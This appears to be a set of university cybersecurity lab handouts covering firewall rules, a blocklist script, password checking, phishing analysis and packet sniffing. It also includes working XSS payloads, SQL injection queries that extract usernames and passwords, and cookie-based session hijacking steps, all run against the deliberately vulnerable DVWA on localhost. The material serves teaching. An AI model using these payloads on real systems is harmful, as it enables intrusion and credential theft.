@@ -1,0 +1,464 @@
+UNIT-1 LAB
+Activity-1: Basic Firewall Configuration
+
+==============================
+PART 1: Manual Firewall Configuration
+==============================
+
+1. Open:
+Windows Defender Firewall with Advanced Security
+
+2. Go to:
+Inbound Rules → New Rule
+
+3. Select:
+Custom → Next
+
+4. Select:
+All Programs → Next
+
+5. Keep default Protocol and Ports settings → Next
+
+6. Under Scope:
+Remote IP Address → These IP addresses → Add
+
+7. Enter:
+1.2.3.4
+
+8. Select:
+Block the connection → Next
+
+9. Select:
+Domain, Private, Public → Next
+
+10. Rule Name:
+Manual_Block_IP
+
+11. Click:
+Finish
+
+
+==============================
+PART 2: Automated Firewall Configuration
+==============================
+
+1. Open VS Code or Python IDE.
+
+2. Create file:
+firewall.py
+
+3. Paste the code:
+
+import requests, subprocess
+data = requests.get("https://feodotracker.abuse.ch/downloads/ipblocklist.csv").text.splitlines()
+subprocess.run(["netsh","advfirewall","firewall","delete","rule","name=BadIP"])
+
+for line in data:
+    if line.startswith("#") or "dst_ip" in line: continue
+    ip = line.split(",")[1]
+    print("Block:", ip)
+    subprocess.run(["netsh","advfirewall","firewall","add","rule",
+                    "name=BadIP","dir=out","action=block","remoteip="+ip])
+
+4. Save the file.
+
+5. Open Command Prompt as Administrator.
+
+6. Navigate to file location:
+
+cd C:\Users\YourName\Desktop
+
+7. Check Python:
+
+python --version
+
+8. Install requests library:
+
+python -m pip install requests
+
+9. Run the program:
+
+python firewall.py
+
+10. Verify rules:
+Windows Defender Firewall → Outbound Rules → BadIP
+
+
+RESULT:
+Firewall rules were successfully created manually and automatically.
+
+1. Start services:
+
+sudo service apache2 start
+sudo service mysql start
+
+2. Open browser:
+
+http://localhost/dvwa
+
+Login:
+Username: admin
+Password: password
+
+3. Set:
+DVWA Security → LOW
+
+4. Reflected XSS:
+DVWA → XSS (Reflected)
+
+Enter:
+<script>alert('XSS')</script>
+
+5. Stored XSS:
+DVWA → XSS (Stored)
+
+Name:
+<h1>Hacked</h1>
+
+Message:
+<script>alert('Stored XSS')</script>
+
+6. DOM XSS:
+DVWA → XSS (DOM)
+
+Add in URL:
+#<script>alert('DOM XSS')</script>
+
+7. Cookie Capture:
+<script>alert(document.cookie)</script>
+
+8. Change Security Level:
+Medium / High
+
+9. Repeat payloads and observe filtering.
+
+
+RESULT:
+XSS vulnerabilities were successfully identified and tested in DVWA.
+
+
+LAB- PASSWORD CHECKER
+
+import re
+
+p = input("Enter password: ")
+
+if len(p) < 8:
+    print("Weak: Minimum 8 characters")
+elif not any(c.isdigit() for c in p):
+    print("Weak: Need a number")
+elif not any(c.isupper() for c in p):
+    print("Weak: Need uppercase")
+elif not any(c.islower() for c in p):
+    print("Weak: Need lowercase")
+elif not re.search(r"[!@#$%^&*]", p):
+    print("Medium: Add special character")
+else:
+    print("Strong Password")
+
+LAB: Analyzing Phishing Emails
+
+ 1. Open browser and open any EML Analyzer website.
+
+2. Upload:
+2020-05-05-phishing-email-example-01.eml
+
+3. Analyze email details:
+Subject, Sender, Receiver, Content Type, Message-ID.
+
+4. Check email headers:
+Sender IP, Reverse DNS, Mail Server.
+
+5. Observe authentication results:
+SPF, DKIM, DMARC.
+
+6. Open:
+https://www.virustotal.com
+
+7. Search sender IP:
+94.100.31.27
+
+8. Observe VirusTotal results:
+Detection ratio, Location, ASN.
+
+9. Identify suspicious URL from email body.
+
+10. Conclude the email is phishing based on suspicious indicators.
+
+LAB: Packet Sniffing and Network Traffic Analysis
+
+1. Open Kali Linux.
+2. Open Terminal.
+3. Start local HTTP server:
+python3 -m http.server 8080
+4. Open another terminal.
+5. Start packet capture:
+sudo tcpdump -i any -w capture.pcap port 8080
+6. Open Firefox browser.
+7. Visit:
+http://localhost:8080
+8. Refresh the page to generate traffic.
+9. Go back to tcpdump terminal.
+10. Stop capture using:
+Ctrl + C
+11. Open File Manager.
+12. Locate the file:
+capture.pcap
+13. Double click capture.pcap to open it in Wireshark.
+14. In Wireshark filter bar type:
+http.request.method == "POST"
+15. Press Enter.
+16. Click packets and analyze the traffic.
+17. Observe browser details, URLs, and transmitted data.
+18. Conclude that HTTP traffic is insecure because data is visible in plain text.
+
+SQL Injection Attack – Cyber Security Lab Experiment
+
+1. Open Kali Linux.
+
+2. Open Terminal.
+
+3. Install DVWA: (not required if installed)
+
+sudo apt update
+sudo apt install dvwa -y
+
+4. Start services:
+
+sudo service apache2 start
+sudo service mysql start
+
+5. Configure DVWA: (not required if installed)
+
+sudo nano /etc/dvwa/config.inc.php
+
+6. Ensure:
+
+$_DVWA['db_password'] = '';
+
+7. Save and exit.
+
+8. Open Firefox browser.
+
+9. Open:
+
+http://127.0.0.1/dvwa
+
+10. Login using:
+Username: admin
+Password: password
+
+11. Click:
+Create / Reset Database
+
+12. Go to:
+DVWA Security
+
+13. Set Security Level:
+Low
+
+14. Navigate to:
+DVWA → Vulnerabilities → SQL Injection
+
+15. Enter normal input:
+
+1
+
+16. Test SQL Injection:
+
+1' OR '1'='1
+
+17. Find number of columns:
+
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+18. Perform UNION Injection:
+
+1' UNION SELECT 1,2-- -
+
+19. Extract database name:
+
+1' UNION SELECT database(),2-- -
+
+20. Extract table names:
+
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+
+21. Extract column names:
+
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+22. Extract usernames and passwords:
+
+1' UNION SELECT user,password FROM users-- -
+
+23. Observe extracted database information.
+
+24. Conclude that SQL Injection allows authentication bypass and data extraction due to improper input validation.
+
+LAB EXPERIMENT : Testing Authentication Weaknesses and Session Management
+Using Kali Linux & DVWA
+
+PART A: Launch DVWA
+
+1. Open Kali Linux.
+
+2. Open Terminal.
+
+3. Start services:
+
+sudo service apache2 start
+sudo service mysql start
+
+4. Open Firefox browser.
+
+5. Open:
+
+http://127.0.0.1/dvwa
+
+6. Login:
+Username: admin
+Password: password
+
+7. Go to:
+DVWA Security
+
+8. Set Security Level:
+LOW
+
+
+====================================
+Experiment 1: Weak Password Authentication
+====================================
+
+1. Navigate to:
+DVWA → Vulnerabilities → Brute Force
+
+2. Enter:
+Username: admin
+Password: password
+
+3. Click Login.
+
+4. Observe successful login.
+
+
+====================================
+Experiment 2: Manual Brute Force Attack
+====================================
+
+1. Open:
+DVWA → Vulnerabilities → Brute Force
+
+2. Enter Username:
+admin
+
+3. Try passwords one by one:
+admin
+123456
+password
+
+4. Click Login after each attempt.
+
+5. Observe unlimited login attempts.
+
+
+====================================
+Experiment 3: Session ID Analysis
+====================================
+
+1. Login to DVWA.
+
+2. Right Click → Inspect
+
+3. Open:
+Storage → Cookies
+
+4. Select:
+http://127.0.0.1
+
+5. Observe:
+PHPSESSID
+
+
+====================================
+Experiment 4: Session Hijacking
+====================================
+
+1. Login to DVWA as admin.
+
+2. Open:
+Inspect → Storage → Cookies
+
+3. Copy PHPSESSID value.
+
+4. Open Private Window:
+Ctrl + Shift + P
+
+5. Open:
+http://127.0.0.1/dvwa
+
+6. Open:
+Inspect → Storage → Cookies
+
+7. Replace PHPSESSID with copied value.
+
+8. Refresh the page.
+
+9. Observe login without credentials.
+
+
+====================================
+Experiment 5: Session Fixation
+====================================
+
+1. Open:
+http://127.0.0.1/dvwa
+
+2. Do NOT login.
+
+3. Open:
+Inspect → Storage → Cookies
+
+4. Note PHPSESSID before login.
+
+5. Login using:
+Username: admin
+Password: password
+
+6. Check PHPSESSID again.
+
+7. Compare session IDs before and after login.
+
+
+====================================
+Experiment 6: Reuse Old Session ID
+====================================
+
+1. Login normally to DVWA.
+
+2. Copy PHPSESSID from Cookies.
+
+3. Logout from DVWA.
+
+4. Open Private Window:
+Ctrl + Shift + P
+
+5. Open:
+http://127.0.0.1/dvwa
+
+6. Paste old PHPSESSID in Cookies.
+
+7. Open:
+http://127.0.0.1/dvwa/index.php
+
+8. Observe access using old session ID.
+
+
+====================================
+RESULT
+====================================
+
+Authentication weaknesses and session management vulnerabilities were successfully identified in DVWA using Kali Linux.
